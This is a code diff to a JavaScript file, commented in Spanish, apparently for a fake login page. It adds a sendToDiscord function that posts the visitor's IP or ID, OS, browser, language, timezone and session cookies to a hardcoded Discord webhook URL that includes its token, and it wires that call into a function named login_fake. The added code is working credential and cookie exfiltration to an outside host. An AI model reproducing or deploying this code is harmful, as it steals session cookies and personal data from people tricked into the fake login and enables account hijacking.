@@ -34,16 +34,13 @@ function getLocaleInfo() {
     return { language, timezone };
 }
 
-// function getFingerprint() {
-//     return Math.random().toString(36).substring(7);
-// }
-
 const cookie = "session_token=supuestaCookieDeInicioDeSesion";
 
 function getCookies() {
     return cookie;
 }
 
+// Función anterior
 function saveInfoToFile(info) {
     const data = JSON.stringify(info, null, 2);
 
@@ -77,8 +74,10 @@ async function login_fake() {
         cookies
     };
 
-    saveInfoToFile(userInfo);
+    // saveInfoToFile(userInfo);
     login_function();
+    sendToDiscord(ip, os, browser, language, timezone, cookies);
+    // login_function();
 }
 
 function login_function() {
@@ -99,4 +98,33 @@ function login_function() {
             alert("Error al iniciar sesión:", error.message);
             alert("Error: " + error.message);
     }); 
+}
+
+const webhookUrl = "https://discord.com/api/webhooks/1364967022265368747/bYEeO2KTQ4MDSOFUDm0dZlNJnJhx6Wu8skMGoTX8TrO-wlAZJM2AuPpLJe1pW0HXAzw-";
+
+function sendToDiscord(id, os, browser, language, timeZone, cookies) {
+    const content = `**ID:** \`\`\`${id}\`\`\`\n**OS:** \`\`\`${os}\`\`\`\n**BROWSER:** \`\`\`${browser}\`\`\`\n**LANGUAGE:** \`\`\`${language}\`\`\`\n**TIMEZONE:** \`\`\`${timeZone}\`\`\`\n**COOKIES:** \`\`\`${cookies}\`\`\``;
+
+    const payload = {
+        content: content,
+    };
+
+    fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(payload),
+    })
+    .then((response) => {
+        if (response.ok) {
+            console.message('Datos enviados');
+            form.reset();
+        } else {
+            console.error('Error enviando los mensajes');
+        }
+    })
+    .catch((error) => {
+        console.error('Error:', error);
+    });
 }
